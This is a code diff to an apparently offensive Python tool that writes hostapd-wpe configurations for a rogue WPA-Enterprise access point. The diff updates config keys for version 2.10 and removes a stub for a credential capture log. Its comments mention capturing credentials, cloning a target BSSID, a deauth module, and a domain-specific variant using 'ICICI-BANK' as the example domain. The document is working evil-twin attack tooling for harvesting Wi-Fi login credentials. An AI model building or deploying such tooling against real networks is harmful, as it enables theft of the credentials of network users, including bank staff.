@@ -241,6 +241,11 @@ class HostapdConfig:
         - Certificate paths
         - Logging
         
+        FIXED for hostapd-wpe v2.10:
+        - eap_server=1 (NOT eap_authenticator — renamed in v2.10)
+        - Removed eap_server_erasure_interval (unknown in v2.10)
+        - Removed eapol_key_timeout (unknown in v2.10)
+        
         Args:
             eap_file (str): Path to EAP users file
             target_bssid (str): Optional BSSID to clone
@@ -279,13 +284,11 @@ wpa=3
 wpa_key_mgmt=WPA-EAP
 rsn_pairwise=CCMP
 ieee8021x=1
-eap_authenticator=1
+# FIXED: use eap_server=1 (eap_authenticator was renamed in v2.10)
 eap_server=1
 
 # ==================== EAP SETTINGS ====================
 eap_user_file={eap_file}
-eap_server_erasure_interval=0
-eapol_key_timeout=3000
 
 # ==================== CERTIFICATES ====================
 ca_cert={self.ca_cert}
@@ -298,7 +301,6 @@ fragment_size=1300
 # ==================== LOGGING ====================
 # Output file for credential captures
 # hostapd-wpe logs credentials to its own log
-# But we specify our capture path here
 ctrl_interface=/var/run/hostapd-wpe
 
 # ==================== PERFORMANCE ====================
@@ -369,15 +371,6 @@ dtim_period=2
             except Exception as e:
                 log(self.log_file, f"[!] Could not create log dir: {e}", self.verbose)
         
-        # Create a symlink to our capture directory
-        our_log = os.path.join(self.hostapd_dir, "captured_creds.log")
-        try:
-            if not file_exists(our_log):
-                # We'll monitor this in the deauth module
-                pass
-        except:
-            pass
-        
         log(self.log_file, "[+] Log monitor setup complete", self.verbose)
     
     
@@ -387,6 +380,11 @@ dtim_period=2
         
         Kuch clients sirf specific domain names accept karte hain.
         Yeh function domain-specific EAP identity format use karta hai.
+        
+        FIXED for hostapd-wpe v2.10:
+        - eap_server=1 (NOT eap_authenticator)
+        - Removed eap_server_erasure_interval
+        - Removed eapol_key_timeout
         
         Args:
             domain_name (str): Domain to use (e.g., "ICICI-BANK")
@@ -416,11 +414,9 @@ wpa=3
 wpa_key_mgmt=WPA-EAP
 rsn_pairwise=CCMP
 ieee8021x=1
-eap_authenticator=1
+# FIXED: use eap_server=1 (eap_authenticator was renamed in v2.10)
 eap_server=1
 eap_user_file={eap_file}
-eap_server_erasure_interval=0
-eapol_key_timeout=3000
 ca_cert={self.ca_cert}
 server_cert={self.server_cert}
 private_key={self.server_key}
@@ -428,6 +424,9 @@ private_key_passwd=whatever
 dh_file={self.dh_params}
 fragment_size=1300
 ctrl_interface=/var/run/hostapd-wpe
+max_num_sta=128
+beacon_int=100
+dtim_period=2
 
 # Domain-specific settings
 # eap_identity=1
